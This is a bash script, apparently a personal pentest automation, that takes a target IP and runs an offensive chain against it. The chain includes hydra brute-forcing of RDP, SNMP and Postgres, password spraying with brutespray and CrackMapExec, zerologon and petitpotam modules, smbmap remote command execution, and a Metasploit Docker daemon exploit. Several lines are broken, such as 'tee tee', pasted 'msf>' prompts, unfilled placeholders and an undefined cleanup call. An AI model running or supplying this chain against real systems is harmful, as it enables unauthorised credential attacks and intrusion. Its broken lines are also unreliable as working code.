#!/bin/bash

# Automated Security Testing Script
# Author: Jai Kumar
# Version: 1.0
# Description: This script automates various security testing tasks using a set of tools.

set -e

# Set color variables
GREEN='\033[0;32m'
RED='\033[0;31m'
RESET='\033[0m'

# Tools Used:
# - brutespray: Password spraying tool for various services
#   Installation: sudo apt-get install brutespray

# - httpx: Fast and multi-purpose HTTP toolkit
#   Installation: go get -u github.com/projectdiscovery/httpx/cmd/httpx

# - nuclei: Fast and customizable vulnerability scanner
#   Installation: GO111MODULE=on go get -u -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei

# - CrackMapExec (cme): Post-exploitation tool to automate the assessment of large Active Directory networks
#   Installation: sudo apt-get install -y libssl-dev libffi-dev python-dev build-essential && sudo pip install cme

# - SMBGhost: Tool to check for the SMBGhost vulnerability
#   Installation: git clone https://github.com/ly4k/SMBGhost.git

# Note: Ensure that Python3 and nmap are already installed on your system.
# If not, you can install Python3 using your system's package manager, and nmap using: sudo apt-get install nmap

# Set variables
# Prompt user for target IP address
read -p "Enter the target IP address: " IP

# Prompt user for project name
read -p "Enter the project name: " project_name

# Set variables
results_dir="/$HOME/$project_name"
mkdir -p "$results_dir"
 
# Function to perform a scan and save results

echo -e "${GREEN}Performing port scan...${RESET}"
nmap -p- -sC -sV -oA $results_dir/nmap_tcp_scan "$IP"

echo -e "${GREEN}Performing UDP Scan...${RESET}"
nmap -p- -sC -sU -oA $results_dir/nmap_udp_scan "$IP"

echo -e "${GREEN}Nmap Script Scan for 21,22,25${RESET}"

nmap --script "ftp-anon,ftp-vuln*,ftp-*" -p 21 "$IP"
nmap --script ssh-* -p 22 "$IP"
nmap -n --script "*telnet* and safe" -p 23 "$IP"
nmap --script "smtp-brute,smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-vuln-cve2011-1764,smtp-*" -p 25,465,587 --script-args smtp-ntlm-info.domain=example.com "$IP" | tee $results_dir/portwise_script_Scan_results
nmap -sU --script "ntp-info,ntp-monlist,ntp*,ntp* and (discovery or vuln) and not (dos or brute)" -p 123 $IP | tee -a $results_dir/portwise_script_Scan_results

echo -e "${GREEN}Scanning for MSRPC TEST CASES${RESET}"
# Find the Print System Remote Prototol or the Print System Asynchronous Remote Protocol
impacket-rpcdump -port 135 $IP | grep -E 'MS-RPRN|MS-PAR' | tee -a $results_dir/MSRPC_overall_results
# rpcdump for dumping RPC endpoints
impacket-rpcdump -port 135 $IP | tee -a $results_dir/MSRPC_overall_results
nmap --script msrpc-enum -p 135 $IP | tee -a $results_dir/MSRPC_overall_results

echo -e "${GREEN}Running RPC Login checks...${RESET}"
rpcclient -U '' -N "$IP" -c enumdomusers 2>&1 | tee $results_dir/rpc-check.txt
rpcclient -U '' -N "$IP" -c querydispinfo 2>&1 | tee -a $results_dir/rpc-check.txt
rpcclient -U '' -N "$IP" -c enumdomains 2>&1 | tee -a $results_dir/rpc-check.txt
rpcclient -U '' -N "$IP" -c enumdomgroups 2>&1 | tee -a $results_dir/rpc-check.txt

echo -e "${GREEN}Scanning for SMB TEST CASES${RESET}"
nmap --script "smb-brute,smb-enum-shares.nse,smb-enum-users.nse,smb-enum*,smb-protocols,smb-vuln*" -p 445 $IP | tee $results_dir/SMB_overall_results
enum4linux -a -v $IP | tee -a $results_dir/SMB_overall_results
netexec smb $IP -u '' -p '' -M zerologon -M petitpotam | tee -a $results_dir/SMB_overall_results
smbmap -H $IP | tee -a $results_dir/SMB_overall_results
smbclient -N -L $IP | tee -a $results_dir/SMB_overall_results
smbmap -u username -p password -H $IP -x 'ipconfig' | tee -a $results_dir/SMB_overall_results
crackmapexec smb $IP -u username -p password --users | tee -a $results_dir/SMB_overall_results
crackmapexec smb $IP -u users.txt -p password --continue-on-success | tee -a $results_dir/SMB_overall_results
impacket-lookupsid example.local/user@$IP 20000 | tee -a $results_dir/SMB_overall_results
crackmapexec smb $IP -u <username> -H hashes.txt | tee -a $results_dir/SMB_overall_results

echo -e "${GREEN}Running LDAP checks...${RESET}"
nmap --script "ldap-brute,ldap-search,ldap-* and not brute" --script-args "ldap.base='cn=users,dc=cqure,dc=net'" -p 389 $IP | tee $results_dir/LDAP_overall_results
# -k: Use Kerberos authentication
netexec ldap $IP -u usernames.txt -p '' -k | tee -a $results_dir/LDAP_overall_results
# --trusted-for-delegation: Enumerate computers and users with the flag `TRUSTED_FOR_DELEGATION`
netexec ldap $IP -u username -p password --trusted-for-delegation | tee -a $results_dir/LDAP_overall_results

echo -e "${GREEN}Running MSSQL checks...${RESET}"
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $IP | tee $results_dir/mssql_results
cme mssql "$IP" -u 'users.txt' -p 'password.txt' 2>&1  | tee -a $results_dir/mssql_results


echo -e "${GREEN}Running MYSQL checks...${RESET}"
nmap --script "mysql-info,mysql-enum,mysql-brute,mysql-databases,mysql-users,mysql-*" -p 3306 $IP | tee tee $results_dir/mysql_results

echo -e "${GREEN}AJP${RESET}"
nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 $IP | tee tee $results_dir/apache_ajp_results

echo -e "${GREEN}Running RDP checks...${RESET}"
nmap --script "rdp-enum-encryption,rdp-ntlm-info,rdp*" -p 3389 $IP | tee tee $results_dir/rdp_results
#Brute Force Credentials
hydra -l username -P passwords.txt $IP rdp | tee -a tee $results_dir/rdp_results

echo -e "${GREEN}Running SNMP checks ...${RESET}"
nmap -sU --script "snmp-info,snmp-interfaces,snmp-processes,snmp-sysdescr,snmp*" -p 161 $IP
#Brute Force the Community Names
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP snmp
#Snmp-Check is SNMP enumerator.
snmp-check $IP -p 161 -c public

echo -e "${GREEN}Running NFS check...${RESET}"
nmap --script=nfs-ls,nfs-statfs,nfs-showmount -p 111,2049 $IP | tee tee $results_dir/nfs_results

echo -e "${GREEN}Running VNC checks...${RESET}"
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p '5800,5801,5900,5901' $IP | tee tee $results_dir/vnc_results
msf> use auxiliary/scanner/vnc/vnc_none_auth; Spool $results_dir/vncmsf; Set rhosts $IP; run ;Spool off ; exit

echo -e "${GREEN}Running Docker checks...${RESET}"
#PORT 2375, 2376 Pentesting Docker
nmap -sV --script "docker-*" -p 2375,2376 $IP  | tee  $results_dir/docker_Results
msfconsole -q ;use exploit/linux/http/docker_daemon_tcp; spool $results_dir/docker_Results; set rhost $IP; run; spool off ; exit

echo -e "${GREEN}Running Postgresql checks...${RESET}"
#5432,5433 - Postgresql

#Nmap enumeration
nmap --script pgsql-brute -p 5432 <target-ip>
#Brute Force Credentials
hydra -l username -P passwords.txt <target-ip> postgres
hydra -L usernames.txt -p password <target-ip> postgres

echo -e "${GREEN}Looking for web-related vulnerabilities...${RESET}"

echo "$IP" | httpx -p '80,81,82,90,443,444,446,447,448,449,450,451,1947,5000,5800,8000,8443,8080,8081,8089,8888,1072,1556,1947,2068,2560,3128,3172,3387,3580,3582,3652,4343,4480,5000, 
5800,5900,5985,5986,8001,8030,8082,8083,8088,8089,8090,8443,8444,8445,8910,9001,9090,9091,20000' --title | tee $results_dir/httpxresults

echo -e "${GREEN}Using nmap results grabbing web service${RESET}"
cat nmap_tcp_scan.xml | nmapurls | tee nmap_webservice_results

echo -e "${GREEN}Running Nuclei scanning...${RESET}"
#cat $results_dir/httpxresults | nuclei | tee $results_dir/nucleiresults

echo -e "${GREEN}Scanning for SMBv1, signing, and Windows details...${RESET}"
cme smb "$IP" | tee $results_dir/smb_results

echo -e "${GREEN}Extracting SMBv1 IPs...${RESET}"
awk '/smbv1: true/{print $1, $4}' smb_results | tee $results_dir/smbv1_ips

echo -e "${GREEN}Extracting SMB signing false IPs...${RESET}"
awk '/signing: false/{print $1, $4}' smb_results | tee $results_dir/smbsigning_ips

echo -e "${GREEN}Extracting Windows version information...${RESET}"
awk '{print $3}' smb_results | tee $results_dir/windows_version

echo -e "${GREEN}Performing SMB enumeration...${RESET}"
cme smb "$IP" -u '' -p '' --shares 2>&1 | tee $results_dir/null_smb_open_shares
cme smb "$IP" -u 'users.txt' -p 'password.txt' --shares 2>&1  | tee $results_dir/default_shares
cme ssh "$IP" -u 'users.txt' -p 'password.txt' 2>&1  | tee $results_dir/ssh_pwned
cme winrm "$IP" -u 'users.txt' -p 'password.txt' 2>&1 | tee $results_dir/winrm

echo -e "${GREEN}Running password spraying...${RESET}"
python3 $HOME/tools/brutespray/brutespray.py --file $results_dir/ -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt -c -o password_spray_results

echo -e "${GREEN}Checking for BlueKeep vulnerability...${RESET}"
python3 $HOME/tools/bluekeep.py "$IP" | tee -a $results_dir/rdp_results

echo -e "${GREEN}Checking for SMBGhost vulnerability...${RESET}"
python3  $HOME/tools/SMBGhost/scanner.py "$IP" | tee -a 

echo -e "${GREEN}Report generating into html${RESET}"
python3 /users/jai/text2html.py -i $results_dir -o $results_dir/results.html

echo -e "${GREEN}Script execution completed. Results stored in: $results_dir${RESET}"
trap - ERR
cleanup
